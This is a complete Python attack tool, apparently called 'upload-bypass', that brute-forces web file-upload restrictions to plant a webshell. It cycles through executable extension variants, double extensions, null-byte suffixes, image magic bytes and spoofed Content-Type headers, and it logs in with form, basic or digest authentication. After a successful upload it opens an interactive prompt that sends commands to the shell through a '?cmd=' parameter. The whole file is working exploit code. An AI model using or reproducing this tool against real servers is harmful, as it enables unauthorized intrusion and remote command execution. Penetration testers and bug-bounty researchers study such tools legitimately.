#!/usr/bin/env python3

# Made by Sagiv
# Brute forcing technique to bypass file upload restrictions
# The tool requires all its assets, do not try to use it without it

import requests
import optparse
import sys
import json
import urllib
from urllib.parse import urlparse
import bs4 as bs
import requests.cookies
import pickle
import termcolor
import colorama
from requests_html import HTMLSession
from requests.auth import HTTPDigestAuth
from requests.auth import HTTPBasicAuth


def banner():
    banner = """
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 
*                                                                                                                          *
*                                                                                                                          *
*         ██    ██ ██████  ██       ██████   █████  ██████        ██████  ██    ██ ██████   █████  ███████ ███████         *  
*         ██    ██ ██   ██ ██      ██    ██ ██   ██ ██   ██       ██   ██  ██  ██  ██   ██ ██   ██ ██      ██              *  
*         ██    ██ ██████  ██      ██    ██ ███████ ██   ██ █████ ██████    ████   ██████  ███████ ███████ ███████         *  
*         ██    ██ ██      ██      ██    ██ ██   ██ ██   ██       ██   ██    ██    ██      ██   ██      ██      ██         *  
*          ██████  ██      ███████  ██████  ██   ██ ██████        ██████     ██    ██      ██   ██ ███████ ███████         *  
*                                                                                                                          *
*                                                                                                                          *
*          Tool for bypassing upload restriction by different bug bounty techniques                                        *    
*          Coded by: Sagiv                                                                                                 *        
*          github: https://github.com/sAjibuu                                                                              *  
*                                                                                                                          *
*                                                                                                                          *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 
    """
    print(termcolor.colored(banner, 'yellow'))


def save_cookies(session, filename):
    with open(filename, 'wb') as f:
        f.truncate()
        pickle.dump(session.cookies._cookies, f)


def load_cookies(session, filename):
    with open(filename, 'rb') as f:
        cookies = pickle.load(f)

        if cookies:
            jar = requests.cookies.RequestsCookieJar()
            jar._cookies = cookies
            session.cookies = jar
            with open("fancy_cookie.txt", 'w') as fancy:
                fancy.write(str(cookies))
        else:
            return False


def success(success, response, url, filename_ext, counter, brute_force, location, session, headers, proxies, tls):
    if success in response.text:

        print(termcolor.colored(f"[+] Try {counter} with: {filename_ext}", 'green'))

        if location != 'optional':

            print(termcolor.colored(f"[*] File uploaded successfully with: {filename_ext}", 'yellow'))
            domain = urlparse(url).netloc

            if 'http://' in url:
                print(
                    termcolor.colored(
                        f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command",
                        'yellow'))
            else:
                print(
                    termcolor.colored(
                        f"[*] You can access the uploaded file on: https://{domain}{location}{filename_ext}?cmd=command",
                        'yellow'))

            print(termcolor.colored("[*] Results saved in results.txt", 'yellow'))
            f = open("results.txt", "a")
            f.write(f"File uploaded successfully with: {filename_ext}\n")
            f.close()

            while True:
                try:
                    command = input(termcolor.colored("└─$ ", 'green'))
                    cmd_encoded = urllib.parse.quote(command)
                    domain = urlparse(url).netloc

                    if 'http://' in url:
                        final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
                    else:
                        final_url = f"https://{domain}{location}{filename_ext}?cmd={cmd_encoded}"

                    response = session.get(final_url, headers=headers, allow_redirects=False,
                                           proxies=proxies, verify=tls)

                    print(termcolor.colored(f"URL: {final_url}", 'blue'))
                    print(response.text)

                except KeyboardInterrupt:
                    print(termcolor.colored("\nkeyboardinterrupt exception is caught!", 'red'))

                    if brute_force:
                        return True

                    else:
                        sys.exit(1)

        else:
            print(termcolor.colored(f"[*] File uploaded successfully with: {filename_ext}", 'yellow'))
            print(termcolor.colored(f"[*] You can access the uploaded file: {filename_ext}?cmd=command", 'yellow'))
            print(termcolor.colored("[*] Results saved in results.txt", 'yellow'))
            f = open("results.txt", "a")
            f.write(f"File uploaded successfully with: {filename_ext}\n")
            f.close()

            if brute_force:
                return True

            else:
                sys.exit(1)
    else:
        print(termcolor.colored(f"[-] Try {counter} with: {filename_ext}", 'red'))


def auth(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location, username,
         password):
    try:
        session = requests.Session()
        response = session.get(URL)
        scraper = response.text
        soup = bs.BeautifulSoup(scraper, "html.parser")
        form = soup.find('body')
        authentication = str(form)

        if authentication != "None":

            # Form authentication
            session = HTMLSession()
            sauce = session.get(URL)
            soup = bs.BeautifulSoup(sauce.html.html, "html.parser")
            form = soup.find('form')

            try:
                submit_attr = form.find('input', type='submit').get('name')
                username_attr = form.find('input', type='text').get('name')
                password_attr = form.find('input', type='password').get('name')
                data = {
                    f'{username_attr}': f'{username}',
                    f'{password_attr}': f'{password}',
                    f'{submit_attr}': f'submit'
                }

            except:
                username_attr = form.find('input', type='text').get('name')
                password_attr = form.find('input', type='password').get('name')
                data = {
                    f'{username_attr}': f'{username}',
                    f'{password_attr}': f'{password}',
                    'submit': f'submit'
                }

                if data == {}:
                    print(termcolor.colored("Server responded with an empty page!", 'red'))
                    sys.exit(1)

            response = session.post(URL, allow_redirects=True)
            second_response = session.post(response.url, data=data, allow_redirects=True)

            if second_response.url != response.url:

                save_cookies(session, "cookies.txt")

                with open("cookie.txt", 'w') as f:
                    f.write(f"first, {session.cookies.get_dict()}")

                load_cookies(session, "cookies.txt")
                print(termcolor.colored("[*] Authentication worked!", 'green'))
                attributes(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity,
                           location,
                           session)

            else:
                print(termcolor.colored("[-] Username or password is incorrect!", 'red'))
                sys.exit(1)

        else:

            # Basic Authentication
            basic = HTTPBasicAuth(username, password)
            response = session.get(URL, auth=basic)

            if response.text != "" and response.status_code == 200 or response.text == 302:
                print(termcolor.colored("[*] Authentication worked!", 'green'))
                save_cookies(session, "cookies.txt")
                load_cookies(session, "cookies.txt")
                attributes(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity,
                           location,
                           session)

            elif response.status_code == 404:
                print(termcolor.colored("[-] Server responded with 404!", 'red'))
                sys.exit(1)

            else:
                # Digest Authentication
                response = session.get(URL, auth=HTTPDigestAuth(username, password))
                if response.text != "" and response.status_code == 200 or response.text == 302:
                    print(termcolor.colored("[*] Authentication worked!", 'green'))
                    save_cookies(session, "cookies.txt")
                    load_cookies(session, "cookies.txt")
                    attributes(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity,
                               location,
                               session)

                elif response.status_code == 404:
                    print(termcolor.colored("[-] Server responded with 404!", 'red'))
                    sys.exit(1)

                else:
                    print(termcolor.colored("[-] Username or password is incorrect!", 'red'))
                    sys.exit(1)

    except requests.exceptions.RequestException as error:
        raise SystemExit(error)


def attributes(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location,
               session):
    # HTML Scraper for applying all attributes for a website for better accuracy

    request = session.post(URL, allow_redirects=False)
    response = request.text
    soup = bs.BeautifulSoup(response, "html.parser")
    slicing = soup.find_all("input")
    slicing = str(slicing).replace("[", "").replace("]", "")
    slicing = slicing.split(", ")

    form_slicing = soup.find_all("form")
    form_slicing = str(form_slicing).replace("[", "").replace("]", "")
    form_slicing = form_slicing.split(" ")

    data = {}
    file_attr = ""
    form_check = ""
    start_name = 'name="'
    end_name = '"'
    start_value = 'value="'
    end_value = '"'
    action_start = 'action="'
    action_end = '" '

    name = ""
    value = ""
    action = ""

    for i in slicing:

        if 'hidden' in i:
            attribute = str(i)
            attribute = attribute.split(" ")

            for j in attribute:

                if "name" in j:
                    name = j[j.find(start_name) + len(start_name):j.rfind(end_name)]

                if "value" in j:
                    value = j[j.find(start_value) + len(start_value):j.rfind(end_value)]

            attribute_dictionary = "{" + '"' + str(name) + '"' + ": " + '"' + str(value) + '"' + "}"
            hidden_attr = json.loads(attribute_dictionary)
            data.update(hidden_attr)

        if 'file' in i:
            attribute = str(i)
            attribute = attribute.split(" ")

            for j in attribute:

                if "name" in j:
                    file_attr = j[j.find(start_name) + len(start_name):j.rfind(end_name)]

        if 'submit' in i:
            attribute = str(i)
            attribute = attribute.split(" ")

            for j in attribute:

                if "name" in j:
                    name = j[j.find(start_value) + len(start_value):j.rfind(end_value)]
                    attribute_dictionary = "{" + '"' + str(name) + '"' + ": " + '"' + "submit" + '"' + "}"
                    submit = json.loads(attribute_dictionary)
                    data.update(submit)

                else:
                    attribute_dictionary = {"submit": "submit"}
                    data.update(attribute_dictionary)

        for k in form_slicing:

            if 'action' in k:
                action_value = k[k.find(action_start) + len(action_start):k.rfind(action_end)]
                action = action_value
                action = action.replace("'", "").replace('"', "")

                if action != '#':

                    if " + " in action:
                        action = action.replace(' + ', '" + "')
                        action = '"' + action + '"'
                        action = eval(action)

                    elif "+" in action:
                        action = action.replace('+', '"+"')
                        action = '"' + action + '"'
                        action = eval(action)

    if action != "" and action != "#":
        domain = urlparse(URL).netloc

        if 'http://' in URL:
            URL = "http://" + domain + action
        else:
            URL = "https://" + domain + action

    if data != {}:
        file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location,
                       session, file_attr, data)

    # Form scraper inside javascript tags
    elif data == {}:
        request = session.get(URL)
        response = request.text
        soup = bs.BeautifulSoup(response, "html.parser")
        form = soup.find('script')

        temp = str(form)
        new_form = temp.split("<")
        form_check = str(new_form)
    if '/form' in form_check:

        hidden_dic = {}
        submit_dic = {}

        file_attr = ""
        data = {}

        start_name = 'name="'
        end_name = '"'

        start_value = 'value="'
        end_value = '"'

        submit_start = 'value="'
        submit_end = '"'

        action_start = 'action="'
        action_end = '" '

        name = ""
        value = ""
        action = ""

        for i in new_form:

            if 'hidden' in i:
                hidden_attribute = str(i)
                hidden_attribute = hidden_attribute.split(" ")

                for j in hidden_attribute:

                    if "name" in j:
                        name = j[j.find(start_name) + len(start_name):j.rfind(end_name)]

                    if "value" in j:
                        value = j[j.find(start_value) + len(start_value):j.rfind(end_value)]

                    if name != "" and value != "":
                        attribute_dictionary = "{" + '"' + str(name) + '"' + ": " + '"' + str(value) + '"' + "}"
                        data = json.loads(attribute_dictionary)
                        hidden_dic.update(data)
                        name = ""
                        value = ""

            if 'file' in i:
                file_attribute = str(i)
                file_attribute = file_attribute.split(" ")

                for k in file_attribute:

                    if "name" in k:
                        file_attr = k[k.find(start_name) + len(start_name):k.rfind(end_name)]

            if 'submit' in i:
                submit_value = i[i.find(submit_start) + len(submit_start):i.rfind(submit_end)]
                submit_attributes = "{" + '"' + "submit" + '"' + ": " + '"' + str(submit_value) + '"' + "}"
                data = json.loads(submit_attributes)
                submit_dic.update(data)

            if 'action' in i:
                action_value = i[i.find(action_start) + len(action_start):i.rfind(action_end)]
                action = action_value
                action = action.replace("'", "").replace('"', "")

                if action != '#':

                    if " + " in action:
                        action = action.replace(' + ', '" + "')
                        action = '"' + action + '"'
                        action = eval(action)

                    elif "+" in action:
                        action = action.replace('+', '"+"')
                        action = '"' + action + '"'
                        action = eval(action)

        data.update(submit_dic)
        data.update(hidden_dic)

        if action != "" and action != "#":
            domain = urlparse(URL).netloc

            if 'http://' in URL:
                URL = "http://" + domain + action
            else:
                URL = "https://" + domain + action

    else:
        print(termcolor.colored("[-] Couldn't upload files, please check if the url is correct!", 'red'))
        sys.exit(1)

    file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location,
                   session, file_attr, data)


def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location,
                   session, file_attr, data):
    # Brute forcing different extensions and uppercase extensions

    try:
        php = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".phps", ".pht", ".phtm",
               ".phtml",
               ".pgif", ".shtml", ".htaccess", ".phar", ".inc", ".hphp", ".ctp", ".module", ".pHp", ".PhP2", ".PhP3",
               ".PhP4", ".PhP5", ".PhP6", ".PhP7", ".PhPs", ".PhPs", ".pHt", ".pHtm", ".pHtMl", ".pGiF", ".sHtMl",
               ".hTacCess", ".pHar", ".iNc", ".hPhp", ".cTp", ".mOdUle"]
        asp = [".asp", ".aspx", ".config", ".ashx", ".asmx", ".aspq", ".axd", ".cshtm", ".cshtml", ".rem", ".soap",
               ".vbhtm", ".vbhtml", ".asa", ".cer", ".shtml", ".aSp", ".aSpX", ".cOnFig", ".aShx", ".aSmX", ".aSpq",
               ".aXd",
               ".csHtm", ".cShtMl", ".rEm", ".soAp", ".vbHtm", ".vbHtMl", ".aSa", ".cEr", ".shTml"]
        jsp = [".jsp", ".jspx", ".jsw", ".jsv", ".jspf", ".wss", ".do", ".action", ".jSp", ".jSpX", ".jSw", ".jSv",
               ".jsPf",
               ".wSs", ".dO", ".aCtiOn"]
        coldfusion = [".cfm", ".cfml", ".cfc", ".dbm", ".cFm", ".cFml", ".cFc", ".dBm"]
        perl = [".pl", ".cgi", ".pL", ".cGi"]

        counter = 0

        for ext in eval(EXTENSION):

            counter += 1

            filename = f'shell.{EXTENSION}'
            filename_ext = filename.replace("shell.php", f"shell{ext}")
            files = {
                f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg')
            }

            response = session.post(URL, files=files, headers=headers, data=data, proxies=proxies,
                                    allow_redirects=False, verify=TLS)

            if verbosity:
                print(response.text)

            brute = success(SUCCESS, response, URL, filename_ext, counter, brute_force, location, session, headers,
                            proxies, TLS)

            if brute:
                break

    except requests.exceptions.RequestException as error:
        raise SystemExit(error)

    double_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, counter, proxies, TLS, headers, brute_force, verbosity,
                     location, session, file_attr, data)


def double_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, counter, proxies, TLS, headers, brute_force, verbosity,
                     location, session, file_attr, data):
    # Doubling the extension

    php = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".phps", ".pht", ".phtm", ".phtml",
           ".pgif", ".shtml", ".htaccess", ".phar", ".inc", ".hphp", ".ctp", ".module", ".pHp", ".PhP2", ".PhP3",
           ".PhP4", ".PhP5", ".PhP6", ".PhP7", ".PhPs", ".PhPs", ".pHt", ".pHtm", ".pHtMl", ".pGiF", ".sHtMl",
           ".hTacCess", ".pHar", ".iNc", ".hPhp", ".cTp", ".mOdUle"]
    asp = [".asp", ".aspx", ".config", ".ashx", ".asmx", ".aspq", ".axd", ".cshtm", ".cshtml", ".rem", ".soap",
           ".vbhtm", ".vbhtml", ".asa", ".cer", ".shtml", ".aSp", ".aSpX", ".cOnFig", ".aShx", ".aSmX", ".aSpq", ".aXd",
           ".csHtm", ".cShtMl", ".rEm", ".soAp", ".vbHtm", ".vbHtMl", ".aSa", ".cEr", ".shTml"]
    jsp = [".jsp", ".jspx", ".jsw", ".jsv", ".jspf", ".wss", ".do", ".action", ".jSp", ".jSpX", ".jSw", ".jSv", ".jsPf",
           ".wSs", ".dO", ".aCtiOn"]
    coldfusion = [".cfm", ".cfml", ".cfc", ".dbm", ".cFm", ".cFml", ".cFc", ".dBm"]
    perl = [".pl", ".cgi", ".pL", ".cGi"]
    null = ["%20", "%0a", "%00", "%0d%0a", "/", ".\\", ".", "...."]

    print(termcolor.colored("[-] Trying Doubling PHP extensions technique!", 'magenta'))

    for ext in eval(EXTENSION):

        counter += 1

        filename = f'shell.{EXTENSION}'
        filename_ext = filename.replace(f"shell.{EXTENSION}", f"shell{ext}{ext}")
        files = {
            f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
            'submit': (None, 'Upload Image')
        }

        load_cookies(session, "cookies.txt")

        response = session.post(URL, allow_redirects=False, data=data, files=files, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"},
                                proxies=proxies, verify=TLS)

        if verbosity:
            print(response.text)

        brute = success(SUCCESS, response, URL, filename_ext, counter, brute_force, location, session, headers, proxies,
                        TLS)

        if brute:
            break

    null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location,
               session, file_attr, data)


def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location,
               session, file_attr, data):
    # Adds null bytes to the end of extensions

    php = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".phps", ".pht", ".phtm", ".phtml",
           ".pgif", ".shtml", ".htaccess", ".phar", ".inc", ".hphp", ".ctp", ".module", ".pHp", ".PhP2", ".PhP3",
           ".PhP4", ".PhP5", ".PhP6", ".PhP7", ".PhPs", ".PhPs", ".pHt", ".pHtm", ".pHtMl", ".pGiF", ".sHtMl",
           ".hTacCess", ".pHar", ".iNc", ".hPhp", ".cTp", ".mOdUle"]
    asp = [".asp", ".aspx", ".config", ".ashx", ".asmx", ".aspq", ".axd", ".cshtm", ".cshtml", ".rem", ".soap",
           ".vbhtm", ".vbhtml", ".asa", ".cer", ".shtml", ".aSp", ".aSpX", ".cOnFig", ".aShx", ".aSmX", ".aSpq", ".aXd",
           ".csHtm", ".cShtMl", ".rEm", ".soAp", ".vbHtm", ".vbHtMl", ".aSa", ".cEr", ".shTml"]
    jsp = [".jsp", ".jspx", ".jsw", ".jsv", ".jspf", ".wss", ".do", ".action", ".jSp", ".jSpX", ".jSw", ".jSv", ".jsPf",
           ".wSs", ".dO", ".aCtiOn"]
    coldfusion = [".cfm", ".cfml", ".cfc", ".dbm", ".cFm", ".cFml", ".cFc", ".dBm"]
    perl = [".pl", ".cgi", ".pL", ".cGi"]
    null = ["%20", "%0a", "%00", "%0d%0a", "/", ".\\", ".", "...."]

    print(termcolor.colored(f"[-] Trying null bytes at the end of the {EXTENSION} extensions technique!", 'magenta'))
    
    temp_extension = ALLOWED_EXT

    if "," in temp_extension:

        valid_extensions = temp_extension.split(",")
        
        for val_ext in valid_extensions:
            
            for ext in eval(EXTENSION):

                for byte in null:

                    counter += 1
                    filename = 'shell.php'
                    filename_ext = filename.replace("shell.php", f"shell{ext}{byte}.{val_ext}")
                    files = {
                        f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
                        'submit': (None, 'Upload Image')
                    }

                    response = session.post(URL, files=files, allow_redirects=False, headers=headers, data=data,
                                            proxies=proxies, verify=TLS)

                    if verbosity:
                        print(response.text)

                    brute = success(SUCCESS, response, URL, filename_ext, counter, brute_force, location, session, headers,
                                    proxies, TLS)

                    if brute:
                        break
                        
            magic_bytes(EXTENSION, val_ext, URL, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity,location, session, file_attr, data)
        
    else:
        
      for ext in eval(EXTENSION):

        for byte in null:

            counter += 1
            filename = 'shell.php'
            filename_ext = filename.replace("shell.php", f"shell{ext}{byte}.{temp_extension}")
            files = {
                f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
                'submit': (None, 'Upload Image')
            }

            response = session.post(URL, files=files, allow_redirects=False, headers=headers, data=data,
                                    proxies=proxies, verify=TLS)

            if verbosity:
                print(response.text)

            brute = success(SUCCESS, response, URL, filename_ext, counter, brute_force, location, session, headers,
                            proxies, TLS)

            if brute:
                break
                
      valid = "".join(temp_extension)

      magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location,
                    session, file_attr, data)    
        

def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location,
                session, file_attr, data):
    # Uploading files with image Magic Bytes

    php = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".phps", ".pht", ".phtm", ".phtml",
           ".pgif", ".shtml", ".htaccess", ".phar", ".inc", ".hphp", ".ctp", ".module", ".pHp", ".PhP2", ".PhP3",
           ".PhP4", ".PhP5", ".PhP6", ".PhP7", ".PhPs", ".PhPs", ".pHt", ".pHtm", ".pHtMl", ".pGiF", ".sHtMl",
           ".hTacCess", ".pHar", ".iNc", ".hPhp", ".cTp", ".mOdUle"]
    asp = [".asp", ".aspx", ".config", ".ashx", ".asmx", ".aspq", ".axd", ".cshtm", ".cshtml", ".rem", ".soap",
           ".vbhtm", ".vbhtml", ".asa", ".cer", ".shtml", ".aSp", ".aSpX", ".cOnFig", ".aShx", ".aSmX", ".aSpq", ".aXd",
           ".csHtm", ".cShtMl", ".rEm", ".soAp", ".vbHtm", ".vbHtMl", ".aSa", ".cEr", ".shTml"]
    jsp = [".jsp", ".jspx", ".jsw", ".jsv", ".jspf", ".wss", ".do", ".action", ".jSp", ".jSpX", ".jSw", ".jSv", ".jsPf",
           ".wSs", ".dO", ".aCtiOn"]
    coldfusion = [".cfm", ".cfml", ".cfc", ".dbm", ".cFm", ".cFml", ".cFc", ".dBm"]
    perl = [".pl", ".cgi", ".pL", ".cGi"]
    null = ["%20", "%0a", "%00", "%0d%0a", "/", ".\\", ".", "...."]

    print(termcolor.colored(f"[-] Trying valid {valid} extension before PHP extension with Magic bytes technique!",
                            'magenta'))

    for ext in eval(EXTENSION):  # trying to upload malicious picture with image extensions and their magic bytes

        if valid == 'jpeg' or valid == 'jpg' or valid == 'png' and EXTENSION == 'php':

            counter += 1

            filename = f'shell.{valid}.php'
            filename_ext = filename.replace(F".php", f"{ext}")

            files = {
                f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
                'submit': (None, 'Upload Image')
            }

            response = session.post(URL, files=files, allow_redirects=False, headers=headers, data=data,
                                    proxies=proxies, verify=TLS)

            if verbosity:
                print(response.text)

            brute = success(SUCCESS, response, URL, filename_ext, counter, brute_force, location, session, headers,
                            proxies, TLS)

            if brute:
                break

    print(termcolor.colored(f"[-] Trying valid {valid} extension after {EXTENSION} with Magic bytes technique!",
                            'magenta'))

    for ext in eval(EXTENSION):  # Same loop but checking valid upload extension after server extension!

        if valid == 'jpeg' or valid == 'jpg' or valid == 'png' and EXTENSION == 'php':

            filename = f'shell.php.{valid}'
            filename_ext = filename.replace(".php", f"{ext}")

            files = {
                f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
                'submit': (None, 'Upload Image')
            }

            response = session.post(URL, files=files, headers=headers, allow_redirects=False, data=data,
                                    proxies=proxies, verify=TLS)

            if verbosity:
                print(response.text)

            brute = success(SUCCESS, response, URL, filename_ext, counter, brute_force, location, session, headers,
                            proxies, TLS)

            if brute:
                break

    content_type(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_force, verbosity, location, session,
                 file_attr, data)


def content_type(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_force, verbosity, location, session,
                 file_attr, data):
    # Trying different content types

    print(termcolor.colored("[-] Trying different content-type headers technique!", 'magenta'))

    with open("./content-type.txt", encoding='latin-1') as file:

        for line in file:
            wordlist = line.rstrip()
            counter += 1

            files = {
                f'{file_attr}': (f'shell.{EXTENSION}', open(f'shell.{EXTENSION}', 'rb'), wordlist),
                'submit': (None, 'Upload Image')
            }

            response = session.post(URL, files=files, headers=headers, allow_redirects=False, data=data,
                                    proxies=proxies, verify=TLS)

            if verbosity:
                print(response.text)

            if SUCCESS in response.text:

                print(termcolor.colored(f"[+] Try {counter} with: {wordlist}", 'green'))

                if location != 'optional':

                    print(termcolor.colored(f"[*] File uploaded successfully with Content-Type header: {wordlist}",
                                            'yellow'))
                    domain = urlparse(URL).netloc

                    if 'http://' in URL:
                        print(
                            termcolor.colored(
                                f"[*] You can access the uploaded file on: http://{domain}{location}shell.{EXTENSION}?cmd=command",
                                'yellow'))
                    else:
                        print(
                            termcolor.colored(
                                f"[*] You can access the uploaded file on: https://{domain}{location}shell.{EXTENSION}?cmd=command",
                                'yellow'))

                    print(termcolor.colored("[*] Results saved in results.txt", 'yellow'))
                    f = open("results.txt", "a")
                    f.write(f"File uploaded successfully with: shell.{EXTENSION} and Content-Type: {wordlist}\n")
                    f.close()

                    while True:
                        try:
                            command = input(termcolor.colored("└─$ ", 'green'))
                            cmd_encoded = urllib.parse.quote(command)
                            domain = urlparse(URL).netloc

                            if 'http://' in URL:
                                final_url = f"http://{domain}{location}shell.{EXTENSION}?cmd={cmd_encoded}"
                            else:
                                final_url = f"https://{domain}{location}shell.{EXTENSION}?cmd={cmd_encoded}"

                            response = session.get(final_url, headers=headers, allow_redirects=False,
                                                   proxies=proxies, verify=TLS)

                            print(termcolor.colored(f"URL: {final_url}", 'blue'))
                            print(response.text)

                        except KeyboardInterrupt:
                            print(termcolor.colored("\nkeyboardinterrupt exception is caught!", 'red'))

                            if brute_force:
                                break

                            else:
                                sys.exit(1)

                else:
                    print(termcolor.colored(f"[*] File uploaded successfully with: shell.{EXTENSION}", 'yellow'))
                    print(termcolor.colored(f"[*] You can access the uploaded file: shell.{EXTENSION}?cmd=command",
                                            'yellow'))
                    print(termcolor.colored("[*] Results saved in results.txt", 'yellow'))
                    f = open("results.txt", "a")
                    f.write(f"File uploaded successfully with: shell.{EXTENSION} and Content-Type: {wordlist}\n")
                    f.close()

                    if brute_force:
                        break

                    else:
                        sys.exit(1)
            else:
                print(termcolor.colored(f"[-] Try {counter} with: {wordlist}", 'red'))

    print(termcolor.colored("If everything fails, check if you need to login first and supply username and password!",
                            'blue'))


def main():
    # Main function with all its arguments parsing
    parser = optparse.OptionParser(description=banner())

    parser.add_option('-u', "--url", dest="url",
                      help="Supply the login page, for example: http://192.168.98.200/login.php'",
                      default="required_to_be_true")

    parser.add_option('-s', "--success", type="string", dest="success_message",
                      help="Success message when upload an image, example: 'Image uploaded successfully.'",
                      default="required_to_be_true")

    parser.add_option('-e', "--extension", type="string", dest="extension",
                      help="Provide server backend extension, for example: --extension php (Supported extensions: php,asp,jsp,perl)",
                      default="required_to_be_true")

    parser.add_option('-a', "--allowed", type="string", dest="allowed_extensions",
                      help="Provide allowed extensions to be uploaded, for example: jpeg,png",
                      default="required_to_be_true")

    parser.add_option('-H', "--header", type="string", dest="header",
                      help='(Optional) - for example: \'"X-Forwarded-For": "10.10.10.10"\' - Use double quotes and wrapp it with single quotes. Use comma to separate multi headers.',
                      default="optional")

    parser.add_option('-l', "--location", type="string", dest="location",
                      help='(Optional) - Supply a remote path where the webshell suppose to be. For exmaple: /uploads/',
                      default="optional")

    parser.add_option('-U', "--username", type="string", dest="username",
                      help='(Optional) - Username for authentication. For exmaple: --username admin',
                      default="optional")

    parser.add_option('-P', "--password", type="string", dest="password",
                      help='(Optional) - - Password for authentication. For exmaple: --password 12345',
                      default="optional")

    parser.add_option('-S', "--ssl", action="store_true", dest="ssl", help="(Optional) - No checks for TLS or SSL")

    parser.add_option('-p', "--proxy", action="store_true", dest="proxy",
                      help="(Optional) - Channel the requests through proxy")

    parser.add_option('-c', "--continue", action="store_true", dest="continue_brute",
                      help="(Optional) - If set, the brute force will continue even if one or more methods found!")

    parser.add_option('-v', "--verbose", action="store_true", dest="verbosity",
                      help="(Optional) - Printing the http response in terminal")

    (options, arguments) = parser.parse_args()

    URL = options.url
    HEADER = options.header
    SUCCESS = options.success_message
    EXTENSION = options.extension
    ALLOWED_EXT = options.allowed_extensions
    proxy = options.proxy
    TLS = options.ssl
    brute_force = options.continue_brute
    username = options.username
    password = options.password
    verbosity = options.verbosity
    location = options.location

    if username != 'optional' and password == 'optional':
        print("Password is required!")

    elif username == 'optional' and password != 'optional':
        print("Username is required!")

    if TLS:
        TLS = False

    else:
        TLS = True

    if proxy:
        print("Proxy is on http://127.0.0.1:8080")

        proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'http://127.0.0.1:8080',
        }

    else:

        proxies = {

            'http': None,
            'https': None
        }

    if HEADER != 'optional':

        temp_header = "{" + str(HEADER) + "}"
        headers = json.loads(temp_header)

    else:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.5"
        }

    positional_args = [URL, SUCCESS, EXTENSION, ALLOWED_EXT]

    if len(sys.argv) < 2:
        print("Try '-h or --help' for more information.")
        sys.exit(1)

    else:

        if len(sys.argv) > 2 and "required_to_be_true" in positional_args:
            print("--url, --wordlist, --error and --request are postional arguments!")
            sys.exit(1)

        else:

            if username != 'optional' and password != 'optional':
                colorama.deinit()
                auth(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity,
                     location, username, password)

            else:
                colorama.deinit()
                session = requests.Session()
                attributes(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity,
                           location,
                           session)


if __name__ == "__main__":
    main()
